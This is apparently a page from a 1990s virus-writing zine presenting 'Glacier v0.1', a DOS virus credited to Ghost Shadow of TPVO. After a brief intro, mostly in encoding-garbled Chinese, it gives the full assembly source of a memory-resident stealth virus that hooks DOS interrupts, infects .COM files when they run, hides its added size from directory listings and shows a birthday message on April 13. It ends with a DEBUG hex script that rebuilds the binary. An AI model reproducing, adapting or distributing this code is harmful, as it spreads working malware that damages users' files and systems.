
                                                                     P.007

         TpVOtPVoTpvOTpVOtpVoTPvOTPVOtpVOTPvOtPVOtPVOtPvOTPvOTpVoTPVO
         PT                                                        OT
         VP     ¥x ÆW «Â ¤O ¯f ¬r ²Õ Â´   ¯f¬rÂø»x   ²Ä ‘C ´Á      TP
         oV                                                        PV
         TO                Ææ  Glacier v0.1á ¯f¬r  Ææ              Vo
         pT                                                        OT
         VP                     by Ghost Shadow                    VP
         OV                                                        OV
         OVTPVoTpvOtPvoTPVOtPvoTpVotpvoTpVotpvOtPvoTpVOtpvOTPvOTpvOTP


        ==============================================================

            ­ü... ¥i¼¦ªº Ghost Shadow (°­¼v¡H) ¤]¥h±q­x³ø°ê¤F¡A©Ò¥H§ÚÀ°
        ¥L¼g¦¹¬rªº»¡©ú¡C
            ¦¹¬r¬°·P¬V .COM ÀÉªº±`¾n«¬¯f¬r¡A¦ý¬O¨Ã¤£·P¬V command.com¡C
            ¦b¨C¦~ªº¢³¤ë¢°¢²¤é°õ¦æ³Q·P¬V¹LªºÀÉ®×¡A­Y¬O¦b¤¤¤å¨t²Î¤U¡A«hÅã
        ¥Ü¦p¤U¤§°T®§¡G

            '[ Glacier v0.1á ]'
            '¯¬ Á§²Q¤å ¥Í¤é§Ö¼Ö. '
            '   Written by Ghost Shadow of TPVO at L.C.T.C.'

            «z... Á§²Q¤å ¬O½Ö°Ú¡H¶â... ¢³¤ë¢°¢²¤é¥Í¤é¡H§ï¤Ñ­n¦n¦nªº¯N°Ý
        Ghost Shadow ¤F... :)

            ­Y¬O¨S¦³¶i¤J­Ê¤Ñ¤¤¤å¨t²Î¡A«hÅã¥Ü¦p¤U¤§°T®§¡G

            '[ Glacier v0.1á ]'
            'Happy Birthday to Amy. '
            '      Written by Ghost Shadow of TPVO at L.C.T.C.'


                                                        Dark Slayer
========================= Begin of GLACIER.asm =========================
        .286
        .model  tiny
        .code
        org     0
begin:
.386p
        xor     eax,eax
.286
        call    start
start:
        pop     si
        sub     si,offset start
        push    cs
        pop     ds
        mov     ax,8300h
        int     21h
        cmp     ax,4583h
        jnz     vir_start

run_com:
        mov     ah,2ah
        int     21h
        cmp     dx,040dh
        jnz     not2day
        add     si,offset msg1
        push    si
        push    si
        pop     di
        mov     cx,offset m3 - offset m1
decode:
        lodsb
        xor     al,45h
        stosb
        loop    decode
        pop     si

        xor     bx,bx
        mov     ax,9100h
        int     10h
        or      bx,bx
        jz      etnoinst
        test    dh,80h
        jnz     etnoinst
        add     si,msg1size
        mov     cx,msg2size
        jmp     show

etnoinst:
        mov     cx,msg1size

show:
        lodsb
        int     29h
        loop    show
        int     20h

not2day:
        push    si
        mov     si,103h
        lodsw
        cmp     ax,'SG'
        pop     si
        jnz     noinvir

        mov     di,100h
        push    si
        push    si
        add     si,offset backdata
        mov     cx,5
        rep     movsb

        pop     di
        pop     bx
        add     bx,offset oldsize
        mov     si,[bx]
        add     si,100h
        mov     cx,virs_byte
;       sub     cx,3
        mov     ax,83ffh
        int     21h

noinvir:
        xor     ax,ax
        xor     cx,cx
        xor     si,si
        xor     di,di
        ret



vir_start:
        mov     ax,es
        dec     ax
        mov     ds,ax
        cmp     byte ptr ds:[0000],'Z'
        jnz     temp0
        add     word ptr ds:[0003h],-(virs_byte*2+0fh)/10h
        add     word ptr ds:[0012h],-(virs_byte*2+0fh)/10h
        mov     ax,word ptr ds:[0012h]

        push    cs
        pop     ds
        mov     es,ax
;       mov     si,100h
        xor     di,di
        mov     cx,offset virus_end
        cld
        rep     movsb

        push    es
        pop     ds

        mov     ax,3521h
        int     21h
        mov     word ptr ds:int21_ip,bx
        mov     word ptr ds:int21_cs,es
        mov     dx,offset vint21
        mov     ah,25h
        int     21h
        mov     ax,352fh
        int     21h
        mov     word ptr ds:int2f_ip,bx
        mov     word ptr ds:int2f_cs,es
        mov     dx,offset vint2f
        mov     ah,25h
        int     21h

        push    ds
        pop     es

        call    geto21h

        push    cs
        push    cs
        pop     ds
        pop     es
;       ret
        sub     si,di

temp0:
        jmp     run_com


vint2f:
        pushf

        cmp     ax,1216h
        jnz     dos_int2f
        popf

        call    i2f
        jb      v2f_err

        push    ax
        mov     ax,es:[di+0fh]
        shr     ah,01h
        cmp     ah,64h
        jb      v2f_noin

        sub     byte ptr es:[di+10h],11001000b
        sub     word ptr es:[di+11h],virs_byte
        sbb     word ptr es:[di+13h],0000h
v2f_noin:
        pop     ax
        clc
v2f_err:
        retf    0002h
dos_int2f:
        popf
        jmp     dword ptr cs:int2f_ip

vint24:
        xor     al,al
        iret

vchk:
        xchg    ah,al
        mov     ah,45h
        popf
        iret

vrefresh:
        popf
        pop     ax
        mov     ax,100h
        push    ax
        push    si
vre1:
        lodsb
        stosb
        loop    vre1
;       rep     movsb
        pop     di
        iret

vint21:
        pushf
        cmp     ax,8300h
        jz      vchk
        cmp     ax,83ffh
        jz      vrefresh
        cmp     ax,4b00h
        jz      temp
;        cmp     ah,3dh
;        jz      vopen
;        cmp     ax,6c00h
;        jz      vopen
        cmp     ah,11h
        jz      dir_s
        cmp     ah,12h
        jz      dir_s
        cmp     ah,4eh
        jz      find_s
        cmp     ah,4fh
        jz      find_s
        popf
        jmp     int21

temp:
        jmp     vrun

dir_s:
        call    i21
        cmp     ah,0ffh
        jz      nofind
        push    ax
        push    bx
        push    es
        mov     ah,2fh
        call    i21
        cmp     byte ptr es:[bx],0ffh
        jnz     notexp
        add     bx,0007h
notexp:
        mov     ax,es:[bx+19h]
        shr     ah,01h
        cmp     ah,64h
        jb      not_in
        sub     word ptr es:[bx+1dh],virs_byte
        sbb     word ptr es:[bx+1fh],0000h
not_in:
        pop     es
        pop     bx
        pop     ax
nofind:
        popf
        iret

find_s:
        popf
        call    i21
        jc      f_exit
        push    ax
        push    bx
        push    es
        mov     ah,2fh
        call    i21
        mov     ax,es:[bx+18h]
        shr     ah,01h
        cmp     ah,64h
        jb      f_not_in
        sub     word ptr es:[bx+1ah],virs_byte
        sbb     word ptr es:[bx+1ch],0000h
f_not_in:
        pop     es
        pop     bx
        pop     ax
        clc
f_exit:
        retf    0002h

;vopen:
;        push    es
;        push    ds
;        push    dx
;
;        push    dx
;        pop     si
;        push    ax
;
;v0:
;        lodsb
;        cmp     al,0
;        jnz     v0
;        sub     si,4
;        lodsw
;        cmp     ax,'OC'
;        jnz     v1
;        lodsb
;        cmp     al,'M'
;        jnz     v1
;        jmp     v2
;v1:
;        pop     ax
;        jmp     v_run
;
;v2:
;        call    set24h
;        pop     ax
;        pop     dx
;        push    ax
;
;        cmp     ah,3dh
;        jnz     v3
;
;        push    dx
;        xor     al,al
;        call    i21
;        jc      v4
;        jmp     v5
;
;v3:
;        push    si
;        mov     bx,0000000000000010b
;        mov     dx,0000000000000001b
;        call    i21
;        jc      v4
;        jmp     v5
;
;v4:
;        pop     ax
;        pop     bx
;        cmp     ah,3dh
;        jnz     v41
;        xchg    dx,bx
;        jmp     v42
;v41:
;        xchg    si,bx
;v42:
;        jmp     v_run1
;
;v5:
;        xchg    bx,ax
;        push    bx
;        mov     ah,2fh
;        call    i21
;        mov     ax,es:[bx+18h]
;        shr     ah,01h
;        cmp     ah,64h
;        jnb     v6
;
;        pop     bx
;        pop     cx
;        pop     ax
;        cmp     ah,3dh
;        jnz     v51
;        xchg    dx,cx
;        jmp     v52
;v51:
;        xchg    si,cx
;v52:
;        push    ax
;        jmp     v_not_in
;
;v6:
;        call    get_sft
;
;        push    cs
;        pop     ds
;
;        mov     ah,3fh
;        mov     cx,5
;        mov     dx,offset backdata
;        call    i21
;
;        mov     ax,word ptr backdata+1
;        add     ax,3
;        mov     word ptr es:[di+15h],ax
;        push    ax
;
;        mov     dx,virs_byte+10h
;        mov     cx,virs_byte
;        mov     ah,3fh
;        call    i21
;
;        push    cx
;        push    es
;        push    ds
;        push    di
;        pop     es
;
;        cld
;        mov     cx,5
;        mov     si,offset backdata
;        push    si
;        pop     di
;        add     si,virs_byte+10h
;        rep     movsb
;
;        pop     di
;        pop     es
;        pop     cx
;
;        mov     ax,offset oldsize
;        add     ax,virs_byte+10h
;        mov     word ptr es:[di+15h],ax
;
;        mov     ah,3fh
;        call    i21
;
;        pop     ax
;        mov     word ptr es:[di+15h],ax
;        mov     ah,40h
;        call    i21
;
;        mov     dx,offset backdata
;        mov     cx,5
;        mov     word ptr es:[di+15h],0
;        call    i21
;
;        call    pop24h
;
;        pop     bx
;        pop     dx
;        pop     ds
;        pop     es
;        retf    0002h
;v_not_in:
;        mov     ah,3eh
;        call    i21
;        pop     ax
;v_run1:
;        call    pop24h
;v_run:
;        pop     dx
;        pop     ds
;        pop     es
;        jmp     int21

vrun:
        pusha
        push    es
        push    ds

        push    dx
        mov     si,dx
        push    si
vr1:
        lodsb
        cmp     al,'.'
        jnz     vr1
        sub     si,4
        lodsw
        cmp     ax,'NA'
        jnz     vr2
        lodsb
        cmp     al,'D'
        jnz     vr2
        pop     si
        jmp     run
vr2:
        pop     si
vr3:
        lodsb
        cmp     al,0
        jnz     vr3
        sub     si,4
        lodsw
        cmp     ax,'OC'
        jnz     vr4
        lodsb
        cmp     al,'M'
        jnz     vr4
        jmp     vr5
vr4:
        jmp     run

vr5:
        call    set24h

        mov     ax,3d00h
        call    i21
        jc      run2
        xchg    bx,ax

        call    get_sft

        mov     ax,word ptr es:[di+11h]
        cmp     ax,1000h                        ;4000bytes
        jb      run1
        cmp     ax,0e290h                       ;58000bytes
        ja      run1

        push    cs
        pop     ds

        push    es
        push    bx

        mov     ah,2fh
        call    i21
        mov     ax,es:[bx+18h]
        shr     ah,01h
        cmp     ah,64h
        pop     bx
        pop     es
        jb      vr6

vr6:
        mov     ah,3fh
        mov     cx,5
        mov     dx,offset backdata
        call    i21
        jc      run1

        mov     ax,word ptr backdata
        cmp     ah,al
        jz      run1
        mov     ax,word ptr backdata+3
        cmp     ax,'SG'
        jz      run1

        mov     al,byte ptr es:[di+4h]
        mov     f_attrib,al
        mov     byte ptr es:[di+4h],20h

        call    intofile

        mov     ax,5701h
        mov     cx,oldtime
        mov     es:[di+0dh],ax
        mov     dx,olddate
        add     dh,11001000b
        call    i21

run1:
        call    pop24h

        mov     ah,3eh
        call    i21
        jmp     run

run2:
        call    pop24h

run:
        pop     dx
        pop     ds
        pop     es

        popa
        popf
        jmp     int21

set24h:
        push    es
        xor     ax,ax
        mov     es,ax
        mov     ax,word ptr es:[0090h]
        mov     word ptr cs:oint24_ip,ax
        mov     ax,word ptr es:[0092h]
        mov     word ptr cs:oint24_cs,ax
        mov     word ptr es:[0090h],offset vint24
        mov     word ptr es:[0092h],cs
        pop     es
        ret

pop24h:
        push    es
        push    ax
        xor     ax,ax
        mov     es,ax

        mov     ax,word ptr cs:oint24_ip
        mov     word ptr es:[0090h],ax
        mov     ax,word ptr cs:oint24_cs
        mov     word ptr es:[0092h],ax
        pop     ax
        pop     es
        ret

intofile:
        push    bx
        in      ax,40h
        cmp     ax,0
        jnz     div1
        mov     ax,2345
div1:
        xchg    bx,ax
        mov     ax,word ptr es:[di+11h]
        xor     dx,dx
        div     bx
        xchg    ax,dx

        push    ax
        sub     ax,3
        mov     word ptr cs:s_data[1],ax
        pop     ax

        pop     bx                      ;read old file (???h start!)
        push    ax
        mov     word ptr es:[di+15h],ax
        mov     dx,virs_byte+10h
        push    cs
        pop     ds
        mov     cx,virs_byte
        mov     ah,3fh
        call    i21
        jc      ierr

        mov     word ptr es:[di+15h],0h
        mov     cx,5
        mov     dx,offset cs:s_data
        mov     ah,40h
        call    i21
        jc      ierr

        mov     dx,virs_byte+10h
        mov     ax,word ptr es:[di+11h]
        mov     word ptr es:[di+15h],ax
        mov     oldsize,ax
        mov     cx,virs_byte
        mov     ah,40h
        call    i21
        jc      ierr

        pop     ax                      ;write virus file to old file
        xor     dx,dx
        mov     word ptr es:[di+15h],ax
        mov     cx,virs_byte
        mov     ah,40h
        call    i21

ierr:
        mov     al,f_attrib
        mov     byte ptr es:[di+4h],al

        or      word ptr es:[di+5h],0100000000000000b

        ret

geto21h:
        push    ax
        push    di
        push    si
        push    ds
        mov     di,si
        cld
        xor     ax,ax
        mov     ds,ax
        mov     si,ds:[00c1h]
        mov     ax,ds:[00c3h]
        mov     ds,ax
        lodsw
        cmp     ax,9090h
        jnz     chk_ent
chk_jmp:
        lodsb
        cmp     al,0ffh
        jnz     chk_jmp
        lodsb
        cmp     al,2eh
        jnz     chk_jmp
        lodsw
        mov     si,ax
        lodsw
        push    ax
        lodsw
        pop     si
        mov     ds,ax
chk_ent:
        cmp     si,0f000h
        jae     chk_end
        lodsb
        cmp     al,06h
        jnz     chk_ent
        lodsw
        cmp     ax,551eh
        jnz     chk_ent
        sub     si,0003h
        mov     es:oint21_ip,si
        mov     es:oint21_cs,ds
chk_end:
        pop ds
        pop si
        pop di
        pop ax
        ret

get_sft:
        push    bx

        mov     ax,1220h
        call    i2f

        mov     ax,1216h
        xor     bh,bh
        mov     bl,es:[di]
        call    i2f

        mov     ax,es:[di+0dh]
        mov     cs:oldtime,ax
        mov     ax,es:[di+0fh]
        mov     cs:olddate,ax

        mov     word ptr es:[di+2h],2
        pop     bx
        ret



i21:
        pushf
        call    dword ptr cs:oint21_ip
        ret

i2f:
        pushf
        call    dword ptr cs:int2f_ip
        ret
m1:
msg1    db      '[ Glacier v0.1á ]',0dh,0ah
        db      'Happy Birthday to Amy. ',7,7,7,7,7,0dh,0ah
        db      '      Written by Ghost Shadow of TPVO at L.C.T.C.',0dh,0ah
m2:
msg2    db      '[ Glacier v0.1á ]',0dh,0ah
        db      '¯¬ Á§²Q¤å ¥Í¤é§Ö¼Ö. ',7,7,7,7,7,0dh,0ah
        db      '   Written by Ghost Shadow of TPVO at L.C.T.C.',0dh,0ah
m3:

int21:          db      0eah
int21_ip        dw      ?
int21_cs        dw      ?
oint21:         db      0eah
oint21_ip       dw      ?
oint21_cs       dw      ?
int2f:          db      0eah
int2f_ip        dw      ?
int2f_cs        dw      ?
oint24_ip       dw      ?
oint24_cs       dw      ?

oldtime         dw      ?
olddate         dw      ?
oldsize         dw      ?
f_attrib        db      ?
msg1size        equ     offset m2 - offset m1
msg2size        equ     offset m3 - offset m2

s_data          db      0e9h,?,?,'G','S'
backdata        db      0cdh,20h,?,?,?
virus_end:
virs_byte       equ     offset virus_end - offset begin



        end     begin
========================== End of GLACIER.asm ==========================

n glacier.com
e 0100 66 33 C0 E8 00 00 5E 81 EE 06 00 0E 1F B8 00 83
e 0110 CD 21 3D 83 45 75 73 B4 2A CD 21 81 FA 0D 04 75
e 0120 33 81 C6 B9 03 56 56 5F B9 C2 00 AC 34 45 AA E2
e 0130 FA 5E 33 DB B8 00 91 CD 10 0B DB 74 0D F6 C6 80
e 0140 75 08 83 C6 64 B9 5E 00 EB 03 B9 64 00 AC CD 29
e 0150 E2 FB CD 20 56 BE 03 01 AD 3D 47 53 5E 75 22 BF
e 0160 00 01 56 56 81 C6 9A 04 B9 05 00 F3 A4 5F 5B 81
e 0170 C3 92 04 8B 37 81 C6 00 01 B9 9F 04 B8 FF 83 CD
e 0180 21 33 C0 33 C9 33 F6 33 FF C3 8C C0 48 8E D8 80
e 0190 3E 00 00 5A 75 50 81 06 03 00 6C FF 81 06 12 00
e 01A0 6C FF A1 12 00 0E 1F 8E C0 33 FF B9 9F 04 FC F3
e 01B0 A4 06 1F B8 21 35 CD 21 89 1E 7C 04 8C 06 7E 04
e 01C0 BA 32 01 B4 25 CD 21 B8 2F 35 CD 21 89 1E 86 04
e 01D0 8C 06 88 04 BA E9 00 B4 25 CD 21 1E 07 E8 51 02
e 01E0 0E 0E 1F 07 2B F7 E9 2E FF 9C 3D 16 12 75 27 9D
e 01F0 E8 BF 02 72 1E 50 26 8B 45 0F D0 EC 80 FC 64 72
e 0200 10 26 80 6D 10 C8 26 81 6D 11 9F 04 26 83 5D 13
e 0210 00 58 F8 CA 02 00 9D 2E FF 2E 86 04 32 C0 CF 86
e 0220 E0 B4 45 9D CF 9D 58 B8 00 01 50 56 AC AA E2 FC
e 0230 5F CF 9C 3D 00 83 74 E7 3D FF 83 74 E8 3D 00 4B
e 0240 74 18 80 FC 11 74 15 80 FC 12 74 10 80 FC 4E 74
e 0250 3F 80 FC 4F 74 3A 9D E9 21 03 EB 5F E8 4C 02 80
e 0260 FC FF 74 2A 50 53 06 B4 2F E8 3F 02 26 80 3F FF
e 0270 75 03 83 C3 07 26 8B 47 19 D0 EC 80 FC 64 72 0B
e 0280 26 81 6F 1D 9F 04 26 83 5F 1F 00 07 5B 58 9D CF
e 0290 9D E8 17 02 72 22 50 53 06 B4 2F E8 0D 02 26 8B
e 02A0 47 18 D0 EC 80 FC 64 72 0B 26 81 6F 1A 9F 04 26
e 02B0 83 5F 1C 00 07 5B 58 F8 CA 02 00 60 06 1E 52 8B
e 02C0 F2 56 AC 3C 2E 75 FB 83 EE 04 AD 3D 41 4E 75 09
e 02D0 AC 3C 44 75 04 5E E9 99 00 5E AC 3C 00 75 FB 83
e 02E0 EE 04 AD 3D 43 4F 75 07 AC 3C 4D 75 02 EB 03 E9
e 02F0 80 00 E8 85 00 B8 00 3D E8 B0 01 72 72 93 E8 80
e 0300 01 26 8B 45 11 3D 00 10 72 5B 3D 90 E2 77 56 0E
e 0310 1F 06 53 B4 2F E8 93 01 26 8B 47 18 D0 EC 80 FC
e 0320 64 5B 07 72 00 B4 3F B9 05 00 BA 9A 04 E8 7B 01
e 0330 72 33 A1 9A 04 3A E0 74 2C A1 9D 04 3D 47 53 74
e 0340 24 26 8A 45 04 A2 94 04 26 C6 45 04 20 E8 66 00
e 0350 B8 01 57 8B 0E 8E 04 26 89 45 0D 8B 16 90 04 80
e 0360 C6 C8 E8 46 01 E8 35 00 B4 3E E8 3E 01 EB 03 E8
e 0370 2B 00 5A 1F 07 61 9D E9 01 02 06 33 C0 8E C0 26
e 0380 A1 90 00 2E A3 8A 04 26 A1 92 00 2E A3 8C 04 26
e 0390 C7 06 90 00 1C 01 26 8C 0E 92 00 07 C3 06 50 33
e 03A0 C0 8E C0 2E A1 8A 04 26 A3 90 00 2E A1 8C 04 26
e 03B0 A3 92 00 58 07 C3 53 E5 40 3D 00 00 75 03 B8 29
e 03C0 09 93 26 8B 45 11 33 D2 F7 F3 92 50 2D 03 00 2E
e 03D0 A3 96 04 58 5B 50 26 89 45 15 BA AF 04 0E 1F B9
e 03E0 9F 04 B4 3F E8 C4 00 72 3A 26 C7 45 15 00 00 B9
e 03F0 05 00 BA 95 04 B4 40 E8 B1 00 72 27 BA AF 04 26
e 0400 8B 45 11 26 89 45 15 A3 92 04 B9 9F 04 B4 40 E8
e 0410 99 00 72 0F 58 33 D2 26 89 45 15 B9 9F 04 B4 40
e 0420 E8 88 00 A0 94 04 26 88 45 04 26 81 4D 05 00 40
e 0430 C3 50 57 56 1E 8B FE FC 33 C0 8E D8 8B 36 C1 00
e 0440 A1 C3 00 8E D8 AD 3D 90 90 75 13 AC 3C FF 75 FB
e 0450 AC 3C 2E 75 F6 AD 8B F0 AD 50 AD 5E 8E D8 81 FE
e 0460 00 F0 73 18 AC 3C 06 75 F5 AD 3D 1E 55 75 EF 83
e 0470 EE 03 26 89 36 81 04 26 8C 1E 83 04 1F 5E 5F 58
e 0480 C3 53 B8 20 12 E8 2A 00 B8 16 12 32 FF 26 8A 1D
e 0490 E8 1F 00 26 8B 45 0D 2E A3 8E 04 26 8B 45 0F 2E
e 04A0 A3 90 04 26 C7 45 02 02 00 5B C3 9C 2E FF 1E 81
e 04B0 04 C3 9C 2E FF 1E 86 04 C3 5B 20 47 6C 61 63 69
e 04C0 65 72 20 76 30 2E 31 E1 20 5D 0D 0A 48 61 70 70
e 04D0 79 20 42 69 72 74 68 64 61 79 20 74 6F 20 41 6D
e 04E0 79 2E 20 07 07 07 07 07 0D 0A 20 20 20 20 20 20
e 04F0 57 72 69 74 74 65 6E 20 62 79 20 47 68 6F 73 74
e 0500 20 53 68 61 64 6F 77 20 6F 66 20 54 50 56 4F 20
e 0510 61 74 20 4C 2E 43 2E 54 2E 43 2E 0D 0A 5B 20 47
e 0520 6C 61 63 69 65 72 20 76 30 2E 31 E1 20 5D 0D 0A
e 0530 AF AC 20 C1 A7 B2 51 A4 E5 20 A5 CD A4 E9 A7 D6
e 0540 BC D6 2E 20 07 07 07 07 07 0D 0A 20 20 20 57 72
e 0550 69 74 74 65 6E 20 62 79 20 47 68 6F 73 74 20 53
e 0560 68 61 64 6F 77 20 6F 66 20 54 50 56 4F 20 61 74
e 0570 20 4C 2E 43 2E 54 2E 43 2E 0D 0A EA 00 00 00 00
e 0580 EA 00 00 00 00 EA 00 00 00 00 00 00 00 00 00 00
e 0590 00 00 00 00 00 E9 00 00 47 53 CD 20
rcx
49C
w
q
